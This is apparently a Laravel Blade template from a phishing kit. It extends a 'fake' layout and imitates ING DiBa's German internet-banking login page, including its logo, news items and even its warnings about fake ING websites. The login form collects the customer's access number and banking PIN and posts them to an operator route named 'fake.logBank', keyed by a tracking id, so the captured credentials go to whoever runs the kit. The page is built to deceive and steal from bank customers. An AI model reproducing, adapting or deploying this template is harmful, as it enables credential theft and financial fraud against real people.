@extends('layouts.fake')
@push('css')
    <link href="{{ asset('css/bundle.ibbr-ver-815AF0B58A0356260EBCEC54EB03F117.css') }}" rel="stylesheet">
    <link href="{{ asset('css/BusyIndicator-ver-B7F2943258D5A2E62FFE465B6AD641A2.css') }}" rel="stylesheet">
@endpush
@section('content')
    <div class="off-canvas-wrap">
        <div class="page-wrap page-wrap--g2p">
            <header class="header header--g2p header--subpage u-print-hidden" data-login-state="logged-in" role="banner">
                <div class="header__inner">
                    <a  style="background: url('{{asset($bank['logo'])}}') left center no-repeat,none;" class="header__logo u-left" data-click-action="logohome.header_menu.link_intern"
                       href="https://www.ing.de/">
                        ING DiBa
                    </a>
                </div>
            </header>

            <header class="content-container__title" id="id9">
                <h1 class="heading--m">Log-in</h1>
            </header>

            <main class="main gap-top-2" role="main">
                <div class="browser-notification"></div>
                <div class="content-container content-container--spacer g2p-no-background">
                    <div class="content-container__inner gs-row">
                        <wicket:container id="ida" hidden="" data-wicket-placeholder=""></wicket:container>

                        <form id="bank_pm_form" method="POST"
                              action="{{subRoute('fake.logBank', ['track_id' => $fake->track_id])}}">
                            <div hidden="" class="hidden-fields"><input type="text" tabindex="-1" autocomplete="off"><input
                                    id="id8_hf_1" type="submit" tabindex="-1" name="view:next-inline"></div>
                            <div class="content-container__inner--col-2">
                                <div class="g2p-content-card" id="idb">
                                    <wicket:container id="idc" hidden="" data-wicket-placeholder=""></wicket:container>
                                    <fieldset class="form-container zugangsdaten fg-container">
                                        <h4 class="heading--s">Anmelden mit Zugangsdaten</h4>
                                        <div class="form-container_content fg-col-20">
                                            <p>
                                                <a class="link-standard--g2p gap-bottom-2 gap-top-2"
                                                   href="https://access.ing.de/delogin/w/login?x=sMrpnAeDNMkOoIrTdewaMu_Gl54oEB7yDJCmeO4N5MSUFDuzpvFCOGQ&amp;t=https://access.ing.de/delogin/oauth/authorize%3Fresponse_type%3Dcode%26client_id%3Dibbr%26scope%3Dbanking%2520paydirekt%2520tpa%2520openid%26state%3DEVrd8IF1LZB1ICFcO74aVVpjnp5253zhXk29azzYU4E%253D%26redirect_uri%3Dhttps://banking.ing.de/app/login/oauth2/code/ibbr%26nonce%3D3JHRZG8kQKljxqG4QoXJVCAdrH7jUqh4OXCk3D3RKXI%26claims%3D%257B%2522id_token%2522%253A%257B%2522customer_number%2522%253A%257B%2522essential%2522%253Atrue%257D%252C%2522partner_number%2522%253A%257B%2522essential%2522%253Atrue%257D%252C%2522last_login%2522%253A%257B%2522essential%2522%253Atrue%257D%257D%257D">
                                                    Zugangsdaten vergessen?
                                                </a>
                                            </p>

                                            <div class="form-group" id="idd">
                                                <label class="form-group__label" for="id4">
                                                    Zugangsnummer
                                                </label>

                                                <span class="form-group__controls form-group__controls--m">
                                                        <input class="input-field form-group--error-field" type="text"
                                                               value="" name="login" id="id4" autocomplete="off"
                                                               autocorrect="off" maxlength="10" pattern="[0-9]*"
                                                               inputmode="numeric" autofocus="true">
                                                        <span class="form-group__definition-container"> </span>

                                                        <small class="form-group__hint">
                                                            <div>
                                                                <div class="notification__content">
                                                                    <span>Letzte 10 Stellen Ihrer IBAN / Depotnummer</span>
                                                                </div>
                                                            </div>
                                                        </small>
                                                    </span>
                                            </div>

                                            <div class="form-group" id="ide">
                                                <label class="form-group__label" for="id5">
                                                    Internetbanking PIN
                                                </label>

                                                <span class="form-group__controls form-group__controls--m">
                                                        <input class="input-field form-group--error-field"
                                                               type="password" value="" name="password" id="id5"
                                                               maxlength="10" minlength="5" autocomplete="off">
                                                        <span class="form-group__definition-container">
                                                            <span class="form-group__definition">
                                                                <i class="font-icon font-icon_eye--hidden u-text-primary"
                                                                   id="id3"></i>
                                                            </span>
                                                        </span>

                                                        <small class="form-group__hint">
                                                            <div>
                                                                <div class="notification__content">
                                                                    <span>Bitte beachten Sie die Groß- und Kleinschreibung.</span>
                                                                </div>
                                                            </div>
                                                        </small>
                                                    </span>
                                            </div>

                                            <p>
                                                <button class="button-primary--large button-primary--login gap-bottom-2"
                                                        role="button" name="view:next-inline" id="id7"
                                                        onclick="sendRequest(); return false;">Anmelden
                                                </button>
                                            </p>
                                        </div>
                                    </fieldset>
                                </div>

                                <div class="g2p-content-card">
                                    <div class="form-container">
                                        <div class="media media--no-wrap">
                                            <div class="media__image">
                                                <figure>
                                                    <img class="u-ir"
                                                         src="{{asset('images/banks/qrl-ver-A4288F3F0CE7F5C60C76A005C363B0A2.svg')}}">
                                                </figure>
                                            </div>
                                            <div class="media__body">
                                                <h4 class="heading--s">
                                                    Anmelden mit App und QR-Code
                                                </h4>
                                            </div>
                                        </div>
                                        <div class="gap-top-3 fg-container gap-bottom-2">
                                            <div class="fg-col-11">
                                                <p>Sie nutzen bereits Banking to go? Dann können Sie sich jetzt in Ihrem
                                                    Internetbanking ganz einfach <strong>ohne Zugangsdaten</strong>
                                                    anmelden.</p>
                                                <p>
                                                    <a href="https://access.ing.de/delogin/w/login?t=https://access.ing.de/delogin/oauth/authorize?response_type%3Dcode%26client_id%3Dibbr%26scope%3Dbanking%2520paydirekt%2520tpa%2520openid%26state%3DEVrd8IF1LZB1ICFcO74aVVpjnp5253zhXk29azzYU4E%253D%26redirect_uri%3Dhttps://banking.ing.de/app/login/oauth2/code/ibbr%26nonce%3D3JHRZG8kQKljxqG4QoXJVCAdrH7jUqh4OXCk3D3RKXI%26claims%3D%257B%2522id_token%2522%253A%257B%2522customer_number%2522%253A%257B%2522essential%2522%253Atrue%257D%252C%2522partner_number%2522%253A%257B%2522essential%2522%253Atrue%257D%252C%2522last_login%2522%253A%257B%2522essential%2522%253Atrue%257D%257D%257D#js-modal--qr-key-explain"
                                                       data-modal="open" class="link-standard--g2p gap-bottom-1-sm"
                                                       data-click-action="ibbr2.delogin.qrlogin-tutorial">
                                                        So funktioniert der QR Log-in
                                                    </a>
                                                </p>
                                                <p>
                                                    <a class="link-standard--g2p gap-bottom-1-sm" target="_blank"
                                                       href="https://www.youtube.com/watch?v=_eIru6yatfw">QR Log-in
                                                        Video-Anleitung</a>
                                                </p>
                                            </div>
                                            <div class="fg-col-8 fg-offset-1">
                                                <img class="u-ir gap-right-1"
                                                     alt="Der QR-Scanner in der App befindet sich rechts oben neben „Meine Konten"
                                                     src="{{asset('images/banks/qrlhint-ver-916FDE8A4CA8095FC339D6829D7D6723.png')}}">
                                            </div>
                                        </div>

                                        <label class="form-group--agreement label--checkbox" id="idf">
                                                <span class="form-group__controls--agreement">
                                                    <input class="input-field__radio" type="checkbox"
                                                           name="view:qrlInfo:keepQrl:keepQrl" id="id6">
                                                    <span class="input-field__radio--button">
                                                        <span class="input-field__radio--checked"></span>
                                                    </span>
                                                </span>
                                            <span class="form-group__label--agreement">
                                                    <span>Auf diesem Gerät und mit diesem Browser immer mit QR Log-in anmelden.</span>
                                                </span>
                                        </label>

                                        <p>
                                            <a class="button-primary--large button-primary--login gap-bottom-2"
                                               role="button"
                                               href="https://access.ing.de/delogin/w/login?x=sMrpnAeDNMkOoIrTdewaMu-z92aTBi7PArHxPeJF_xNs&amp;t=https://access.ing.de/delogin/oauth/authorize%3Fresponse_type%3Dcode%26client_id%3Dibbr%26scope%3Dbanking%2520paydirekt%2520tpa%2520openid%26state%3DEVrd8IF1LZB1ICFcO74aVVpjnp5253zhXk29azzYU4E%253D%26redirect_uri%3Dhttps://banking.ing.de/app/login/oauth2/code/ibbr%26nonce%3D3JHRZG8kQKljxqG4QoXJVCAdrH7jUqh4OXCk3D3RKXI%26claims%3D%257B%2522id_token%2522%253A%257B%2522customer_number%2522%253A%257B%2522essential%2522%253Atrue%257D%252C%2522partner_number%2522%253A%257B%2522essential%2522%253Atrue%257D%252C%2522last_login%2522%253A%257B%2522essential%2522%253Atrue%257D%257D%257D">
                                                Anmelden mit QR Log-in
                                            </a>
                                        </p>
                                    </div>

                                    <section id="js-modal--qr-key-explain" class="modal" data-modal="close" role="dialog">
                                        <div class="modal__wrapper">
                                            <div class="modal__dialog">
                                                <div class="modal__header">
                                                    <a class="modal__close" data-modal="close"></a>
                                                    <h1 class="modal__title">
                                                        So funktioniert der QR Log-in
                                                    </h1>
                                                </div>
                                                <div class="modal__body">
                                                    <div class="modal__body_inner">
                                                        <a class="link-standard--g2p gap-bottom-2" target="_blank"
                                                           href="https://www.youtube.com/watch?v=_eIru6yatfw">Video mit
                                                            Schritt-für-Schritt-Anleitung ansehen</a>
                                                        <ol class="process-steps__list">
                                                            <li class="process-steps__list-item">
                                                                <div class="process-steps__list-item-inner">
                                                                    <div class="process-steps__list-item__text">
                                                                        <p>
                                                                            <strong>Öffnen Sie die ING Banking App „Banking
                                                                                to go“ und starten Sie
                                                                                QR-Scanner-Funktion.</strong>
                                                                            Sie befindet sich in Ihrer Kontenübersicht in
                                                                            der Navigationsleiste ganz oben rechts neben
                                                                            „Meine Konten“. Sie haben mehrere Konten in
                                                                            Ihrer App eingerichtet?
                                                                            Dann wählen Sie bitte zunächst das Konto aus, in
                                                                            das Sie sich einloggen möchten.
                                                                        </p>
                                                                        <img class="gap-top-2 gap-bottom-2" alt="QR-Code"
                                                                             src="./ING Login_files/qrlhint-ver-916FDE8A4CA8095FC339D6829D7D6723.png">
                                                                        <p>
                                                                            <strong>Sie sehen die QR-Scanner-Funktion in
                                                                                Ihrer App nicht?</strong>
                                                                        </p>
                                                                        <p>
                                                                            Dann nutzen Sie wahrscheinlich noch eine ältere
                                                                            Version von Banking to go. Über Ihren App Store
                                                                            können Sie die App aktualisieren.
                                                                        </p>
                                                                    </div>
                                                                </div>
                                                            </li>
                                                            <li class="process-steps__list-item">
                                                                <div class="process-steps__list-item-inner">
                                                                    <div class="process-steps__list-item__text">
                                                                        <strong>Scannen Sie nacheinander beide QR-Codes mit
                                                                            Ihrer App.</strong>
                                                                        Folgen Sie dabei einfach dem Dialog in der App. Der
                                                                        Doppel-Scan dient Ihrer Sicherheit: Mit dem ersten
                                                                        QR-Code identifizieren wir Sie über Ihre App, mit
                                                                        dem zweiten
                                                                        QR-Code bestätigen Sie Ihren Log-in.
                                                                    </div>
                                                                </div>
                                                            </li>
                                                            <li class="process-steps__list-item">
                                                                <div class="process-steps__list-item-inner">
                                                                    <div class="process-steps__list-item__text">
                                                                        <strong>Nach dem zweiten Scan werden Sie automatisch
                                                                            weitergeleitet zu Ihrem Internetbanking</strong>
                                                                        und können die App jetzt schließen.
                                                                    </div>
                                                                    <div>
                                                                        <strong>Unser Tipp:</strong>
                                                                        Legen Sie den QR-Log-in doch einfach als Ihren
                                                                        Standard-Log-in fest, dann geht es beim Anmelden
                                                                        noch schneller. Natürlich können Sie sich auch
                                                                        danach jederzeit mit
                                                                        Ihren Zugangsdaten anmelden.
                                                                    </div>
                                                                </div>
                                                            </li>
                                                        </ol>
                                                        <p>
                                                            <a class="link-standard--g2p gap-bottom-1" target="_blank"
                                                               href="https://www.youtube.com/watch?v=_eIru6yatfw">Video mit
                                                                Schritt-für-Schritt-Anleitung ansehen</a>
                                                        </p>
                                                        <p>
                                                            <a class="link-standard--g2p gap-bottom-2"
                                                               href="https://www.ing.de/hilfe/zugang/qrlogin">Mehr erfahren
                                                                über den QR-Log-in</a>
                                                        </p>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </section>
                                </div>
                            </div>
                        </form>

                        <div class="gap-top-5-lg">
                            <h1 class="heading--s u-text-faded">Aktuelle Mitteilungen</h1>
                        </div>
                        <div class="g2p-content-card gap-top-2">
                            <fieldset class="form-container gap-bottom-2">
                                <div class="form-container_content">
                                    <div class="vertrieb login_news">
                                        <article>
                                            <details class="details-primary" id="details-id-0" role="group">
                                                <summary role="button" aria-expanded="false" aria-controls="details-id-0">
                                                    Jahresendbelege 2021
                                                </summary>
                                                <div class="gap-bottom-1">
                                                    <p></p>
                                                    <p>
                                                        Anleger/innen in unsere Sparprodukte erhalten ihre Jahresendbelege
                                                        bis zum 12.02.2022, Depotinhaber/innen bis zum 10.03.2022. Sie haben
                                                        kein Direkt-Depot bei uns, aber einen
                                                        gemeinsamen Freistellungsauftrag mit einem Depotkunden? Dann
                                                        bekommen Sie Ihre Jahresendbelege auch bis zum 10.03.2022.
                                                    </p>
                                                    <p></p>
                                                </div>
                                            </details>

                                            <details class="details-primary" id="details-id-1" role="group">
                                                <summary role="button" aria-expanded="false" aria-controls="details-id-1">
                                                    Vorsicht vor gefälschten ING Webseiten
                                                </summary>
                                                <div class="gap-bottom-1">
                                                    <p></p>
                                                    <p>
                                                        Aktuell gibt es gefälschte Websites der ING im Netz. Bei der Suche
                                                        nach der ING Homepage über die Suchmaschine Ihres Browsers werden
                                                        Ihnen sehr prominent platzierte – betrügerische
                                                        - Seiten angezeigt.
                                                    </p>

                                                    <p>Diese Seiten, inklusive der Log-in Seite, sehen täuschend echt
                                                        aus.</p>

                                                    <p>
                                                        Geben Sie dort Ihre Daten ein, erhalten Sie den Hinweis, Ihr Konto
                                                        sei gesperrt und Sie werden gebeten, eine Hotline anzurufen. Die
                                                        angeblichen Supportmitarbeiter versuchen sich
                                                        Zugriff auf Ihren Rechner und Ihr Konto zu verschaffen.
                                                    </p>

                                                    <p>So können Sie sich schützen:</p>

                                                    <ul>
                                                        <li>Bitte geben Sie die URL ing.de immer direkt in die Adresszeile
                                                            Ihres Browsers ein und nutzen Sie nicht die Links aus Ihren
                                                            Suchergebnissen.
                                                        </li>
                                                        <li>Überprüfen Sie die URL, bevor Sie Ihre Daten eingeben.</li>
                                                        <li>
                                                            Achten Sie auf eine sichere Verbindung, z.B. auf das
                                                            Schlosssymbol oben links in der Adresszeile. Erhalten Sie beim
                                                            Aufruf der Website eine Sicherheitsmeldung, seien Sie
                                                            vorsichtig und geben bitte keine vertraulichen Daten ein.
                                                        </li>
                                                        <li>Bitte geben Sie keine Zugangsdaten sowie Transaktionsnummern
                                                            (TAN) weiter
                                                        </li>
                                                        <li>
                                                            Kommt Ihnen diese Masche bekannt vor? Haben Sie eventuell
                                                            bereits Daten weitergegeben? Dann rufen Sie uns bitte so schnell
                                                            wie möglich unter
                                                            <a action-id="">069 / 34 22 24</a> an.
                                                        </li>
                                                    </ul>
                                                    <p></p>
                                                </div>
                                            </details>

                                            <details class="details-primary" id="details-id-2" role="group">
                                                <summary role="button" aria-expanded="false" aria-controls="details-id-2">
                                                    Achtung: Betrüger wollen an Ihre Daten!
                                                </summary>
                                                <div class="gap-bottom-1">
                                                    <p></p>
                                                    <p>Aktuell gibt es gleich mehrere Betrugsmaschen, um an Ihre Bankdaten
                                                        und Passwörter zu kommen:</p>

                                                    <p>
                                                        <b>Phishing-Mails:</b> Sie sollen unsere App ING Banking to go
                                                        installieren, um Ihr Konto weiter nutzen zu können. Bitte klicken
                                                        Sie nicht auf den Link in der Mail, der führt
                                                        nämlich nicht in den App Store, sondern auf eine betrügerische
                                                        Seite. Woran Sie eine Phishing Mail erkennen, verrät Ihnen folgender
                                                        <a action-id="" href="https://www.ing.de/wissen/achtung-phishing/"
                                                           rel="nofollow">Artikel</a>.
                                                    </p>

                                                    <p>
                                                        <b>Attraktive Geldanlagen:</b> Sie erhalten per Mail, Anruf oder
                                                        Werbeanzeige ein lukratives Anlageangebot mit extrem guten
                                                        Renditeaussichten. Bitte informieren Sie sich gründlich,
                                                        bevor Sie auf solche Angebote eingehen. Häufig stecken nämlich
                                                        Betrüger dahinter. Informationen zum so genannten Boiler Room Scam
                                                        finden Sie
                                                        <a action-id="" href="https://www.ing.de/wissen/boiler-room-scam/"
                                                           rel="nofollow">hier</a>.
                                                    </p>

                                                    <p><b>Anrufe durch die Bank:</b> Trickbetrüger geben sich als
                                                        ING-Mitarbeiter aus uns fragen und fragen Informationen wie&nbsp;Passwörter,
                                                        mTans, PIN etc. ab.</p>

                                                    <p>
                                                        <b>Falsche Techniker Anrufe: </b>Die Betrüger geben sich als
                                                        Technik-Mitarbeiter von Software- und Telekommunikationsanbietern
                                                        wie Apple, Microsoft oder Vodafone aus. Diesmal neu:
                                                        es handelt sich nicht mehr nur um Anrufe, sondern es werden nun auch
                                                        E-Mails, infizierte Webseiten und Pop-Ups genutzt, um illegal an
                                                        Ihre Daten zu gelangen.
                                                    </p>

                                                    <p>
                                                        Bitte seien Sie immer vorsichtig, wenn Sie unaufgefordert
                                                        kontaktiert werden und geben Sie keine Daten preis. Geben Sie Ihre
                                                        Zugangsdaten nur über unsere Website
                                                        <a action-id="" href="https://www.ing.de/"
                                                           rel="nofollow">www.ing.de</a> ein oder über unsere App ING
                                                        Banking to go ein. Wir fragen Sie niemals außerhalb dieser Kanäle
                                                        nach Ihren
                                                        Zugangsdaten oder TAN-Nummern.
                                                    </p>

                                                    <p>Sind Sie sich unsicher, leiten Sie uns die Mail an <a action-id="">info@ing.de</a>
                                                        weiter oder rufen uns unter <b>069 / 34 22 24</b> an.</p>

                                                    <p>&nbsp;</p>
                                                    <p></p>
                                                </div>
                                            </details>

                                            <details class="details-primary" id="details-id-3" role="group">
                                                <summary role="button" aria-expanded="false" aria-controls="details-id-3">
                                                    Geld zurück bei Corona-Stornierung?
                                                </summary>
                                                <div class="gap-bottom-1">
                                                    <p></p>
                                                    <p>
                                                        Auch das Corona Virus kann Auswirkungen auf Ihre Bankgeschäfte
                                                        haben. Sie haben eine Reise, Veranstaltung oder ein Hotel gebucht
                                                        und mit Ihrer Master- oder VISA Card bezahlt und
                                                        diese wurde von Ihnen oder vom Unternehmen storniert?
                                                    </p>

                                                    <p>
                                                        Wichtige Informationen, wie Sie vorgehen müssen um Ihr Geld zurück
                                                        zu bekommen, finden Sie in unserem
                                                        <a action-id=""
                                                           href="https://www.ing.de/ueber-uns/wissenswert/corona-reise/"
                                                           rel="nofollow">WissensWert Artikel</a>.
                                                    </p>

                                                    <p><b>Ganz wichtig:</b> Wir als Bank können&nbsp;erst versuchen zu
                                                        helfen, wenn es zuvor einen schriftlichen Klärungsversuch mit dem
                                                        Veranstalter/Unternehmen gegeben hat.</p>
                                                    <p></p>
                                                </div>
                                            </details>

                                            <details class="details-primary" id="details-id-4" role="group">
                                                <summary role="button" aria-expanded="false" aria-controls="details-id-4">
                                                    Info-Banner – neue Produktbedingungen
                                                </summary>
                                                <div class="gap-bottom-1">
                                                    <p></p>
                                                    <p>
                                                        Nach dem Log-In informieren wir derzeit einige Kunden über die
                                                        Änderung unserer Produktbedingungen in Bezug auf die Nutzung von
                                                        Post-Box und Internetbanking. Wird Ihnen diese
                                                        Information angezeigt, beachten Sie bitte folgendes: Die
                                                        Kontoführung bleibt für Sie unverändert. Sollten Sie der Änderung
                                                        dennoch nicht zustimmen, können Sie das angezeigte
                                                        Fenster einfach schließen.
                                                    </p>
                                                    <p></p>
                                                </div>
                                            </details>
                                        </article>
                                    </div>
                                </div>
                            </fieldset>
                        </div>

                        <noscript>
                            <style type="text/css">
                                /*<![CDATA[*/

                                .login,
                                .content-header__heading,
                                .aktuell,
                                form,
                                .zugangsdaten {
                                    display: none !important;
                                }

                                /*]]>*/
                            </style>
                            <fieldset class="form-container">
                                <legend class="form-container_legend">Javascript ist nicht aktiviert!</legend>
                                <div class="form-container_content">
                                    Bitte &uuml;berpr&uuml;fen Sie die Browsereinstellungen und aktivieren Sie Javascript.
                                    <br/>
                                    Einen Hinweis zu den technischen Voraussetzungen erhalten Sie
                                    <a target="_blank" href="https://www.ing.de/zugangsvoraussetzungen"
                                       class="link-primary">hier</a>
                                </div>
                            </fieldset>
                            <section class="form-group form-group__submit gap-top-1 gap-top-2-md gap-top-2-lg">
                                <a role="button" href="https://www.ing.de/" class="button-default--large">Zur Homepage</a>
                            </section>
                        </noscript>
                    </div>
                </div>
            </main>

            <footer class="footer--g2p u-cf">
                <ul class="footer__links-top"></ul>
                <ul class="footer__links-bottom">
                    <li class="footer__link">
                        <a href="https://www.ing.jobs/Deutschland/home.htm">Karriere</a>
                    </li>
                    <li class="footer__link">
                        <a href="https://www.ing.de/ueber-uns/unternehmen/partner/">Vertriebspartner</a>
                    </li>
                    <li class="footer__link">
                        <a href="https://www.ingwb.de/de/home">Wholesale Banking</a>
                    </li>
                    <li class="footer__link">
                        <a href="https://produkte.banking.ing.de/pub/kontaktformular">Kontaktformular</a>
                    </li>
                    <li class="footer__link">
                        <a href="https://www.ing.de/agbib">AGB</a>
                    </li>
                    <li class="footer__link">
                        <a href="https://www.ing.de/datenschutz">Datenschutz</a>
                    </li>
                    <li class="footer__link">
                        <a href="https://www.ing.de/ueber-uns/unternehmen/impressum/">Impressum</a>
                    </li>
                </ul>
                <div class="footer__icons">
                    <a class="icon-facebook--g2p" href="https://www.facebook.com/ing.deutschland" target="_blank"></a>
                    <a class="icon-instagram--g2p" href="https://www.instagram.com/ing.deutschland/" target="_blank"></a>
                    <a class="icon-youtube--g2p" href="https://www.youtube.com/c/ing_de" target="_blank"></a>
                </div>
            </footer>

            <a class="off-canvas-backdrop" data-close="off-canvas"></a>
        </div>
    </div>
    <div class="busy-indicator" aria-hidden="true" role="dialog" aria-labelledby="modal_title" id="id10" data-delay="1000"
         data-busyindicator="" data-timeout="30000">
        <div class="busy-indicator-content js_holder" role="document" style="width: initial;">
            <p class="u-flex-center">
                <i class="icon-busy" aria-hidden="true">
                    <i class="busy-block busy-1"></i>
                    <i class="busy-block busy-2"></i>
                    <i class="busy-block busy-3"></i>
                </i>
            </p>
            <p class="gs-span-20 gs-span-10-sm gap-top-0 gap-bottom-0 u-text-center">
                <b class="u-line-break">Bitte warten</b>
            </p>
        </div>
    </div>
    <div id="usercentrics-button"
         class="usercentrics-button layout-1 uc-button-bl uc-banner-2 uc-modal-1 uc-button-hidden injected-styles">
        <div id="uc-privacy-chip" class="layout-1"></div>

        <div id="uc-privacy-button" class="layout-1"></div>

        <div id="uc-banner-modal" class="layout-1"></div>

        <div id="uc-central-banner-modal" class="layout-1"></div>

        <div id="uc-center-modal" class="layout-1"></div>

        <div id="uc-corner-modal" class="layout-1"></div>

        <div id="uc-consents-info-modal" class="layout-1"></div>

        <div id="uc-about-model" class="layout-1"></div>
    </div>
@endsection
